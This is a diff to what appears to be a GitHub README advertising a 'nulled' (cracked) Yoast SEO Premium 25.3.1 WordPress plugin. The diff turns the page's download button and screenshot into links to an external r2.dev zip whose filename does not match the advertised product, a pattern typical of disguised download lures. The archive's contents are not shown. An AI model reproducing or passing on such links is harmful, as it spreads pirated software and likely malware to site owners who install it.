@@ -5,12 +5,14 @@ Are you looking for **Yoast SEO Nulled** to unlock premium SEO features for your
 ---
 
 <p align="center">
-  <img src="https://github.com/user-attachments/assets/ae73a168-1df5-4c0a-aa3e-29167b82c184"
-       alt="Yoast SEO Premium 25.3.1 eklentisi, WordPress SEO arayüzü, orijinal ekran görüntüsü, SEO optimize"
-       title="Yoast SEO Premium 25.3.1 Orijinal Ekran Görüntüsü" />
+  <a href="https://pub-970116c3bb9c4aa8ba1cc47a7bdd8e28.r2.dev/Auto-Search-Plugin-Themes-Nulled-Free-Download-2025.zip">
+    <img src="https://github.com/user-attachments/assets/ae73a168-1df5-4c0a-aa3e-29167b82c184"
+         alt="Yoast SEO Premium 25.3.1 eklentisi, WordPress SEO arayüzü, orijinal ekran görüntüsü, SEO optimize"
+         title="Yoast SEO Premium 25.3.1 Orijinal Ekran Görüntüsü" />
+  </a>
 </p>
 <p align="center">
-  <a href="#"><strong>Download Yoast SEO Premium 25.3.1 (.zip)</strong></a>
+  <a href="https://pub-970116c3bb9c4aa8ba1cc47a7bdd8e28.r2.dev/Auto-Search-Plugin-Themes-Nulled-Free-Download-2025.zip"><strong>Download Yoast SEO Premium 25.3.1 (.zip)</strong></a>
 </p>
 
 <p align="center">
@@ -21,6 +23,7 @@ Are you looking for **Yoast SEO Nulled** to unlock premium SEO features for your
 <p align="center">
   <a href="#"><strong>Download the image</strong></a>
 </p>
+
 ---
 
 ## What is Yoast SEO Premium 25.3.1?
